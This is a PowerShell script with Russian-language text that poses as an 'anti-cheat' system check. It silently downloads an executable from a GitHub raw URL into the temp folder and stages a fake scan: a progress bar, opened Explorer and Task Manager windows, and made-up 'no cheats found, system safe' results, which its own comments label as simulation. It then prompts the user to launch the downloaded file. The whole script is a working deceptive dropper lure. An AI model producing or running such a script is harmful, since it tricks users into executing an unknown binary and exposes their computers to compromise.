# Скачиваем программу
$exeUrl = "https://github.com/gseff137-afk/1111/raw/refs/heads/main/cheker.exe"
$exePath = "$env:TEMP\cheker.exe"
iwr $exeUrl -OutFile $exePath -UseBasicParsing

# Симуляция проверки с кнопкой далее
Add-Type -AssemblyName System.Windows.Forms

# Окно приветствия
[System.Windows.Forms.MessageBox]::Show("Античит система v2.0`nНажмите OK для начала проверки", "Проверка системы", "OK", "Information")

# Симуляция сканирования
$form = New-Object System.Windows.Forms.Form
$form.Text = "Сканирование системы"
$form.Size = New-Object System.Drawing.Size(400,200)
$form.StartPosition = "CenterScreen"

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(20,20)
$label.Size = New-Object System.Drawing.Size(350,60)
$label.Text = "Идет проверка системы на наличие читов...`nПожалуйста, подождите 30 секунд"
$form.Controls.Add($label)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20,100)
$progressBar.Size = New-Object System.Drawing.Size(350,30)
$progressBar.Style = "Marquee"
$form.Controls.Add($progressBar)

# Запускаем форму в отдельном потоке
$form.Add_Shown({$form.Activate()})
$job = Start-Job {
    $form.ShowDialog()
}
Start-Sleep 30

# Закрываем форму проверки
Stop-Job $job
Remove-Job $job

# Симуляция проверки папок
Write-Host "`n=== ПРОВЕРКА СИСТЕМЫ ===" -ForegroundColor Cyan
Write-Host "1. Сканирование диска C:\..." -ForegroundColor Yellow
Start-Sleep 3
explorer C:\
Write-Host "   ✓ Проверено" -ForegroundColor Green

Write-Host "2. Анализ временных файлов..." -ForegroundColor Yellow
Start-Sleep 3
explorer $env:TEMP
Write-Host "   ✓ Проверено" -ForegroundColor Green

Write-Host "3. Проверка системных файлов..." -ForegroundColor Yellow
Start-Sleep 3
explorer C:\Windows
Write-Host "   ✓ Проверено" -ForegroundColor Green

Write-Host "4. Мониторинг процессов..." -ForegroundColor Yellow
Start-Sleep 3
taskmgr
Write-Host "   ✓ Проверено" -ForegroundColor Green

Write-Host "5. Финальная проверка..." -ForegroundColor Yellow
Start-Sleep 5
Write-Host "`n=== РЕЗУЛЬТАТЫ ====" -ForegroundColor Green
Write-Host "✓ Читы не обнаружены" -ForegroundColor Green
Write-Host "✓ Система безопасна" -ForegroundColor Green
Write-Host "✓ Все проверки пройдены" -ForegroundColor Green

# Кнопка далее для запуска программы
$result = [System.Windows.Forms.MessageBox]::Show("Проверка завершена успешно!`nЧиты не обнаружены.`nЗапустить программу?", "Проверка завершена", "YesNo", "Question")

if ($result -eq "Yes") {
    # Запускаем скачанную программу
    & $exePath
} else {
    [System.Windows.Forms.MessageBox]::Show("Программа не будет запущена", "Отменено", "OK", "Information")
}
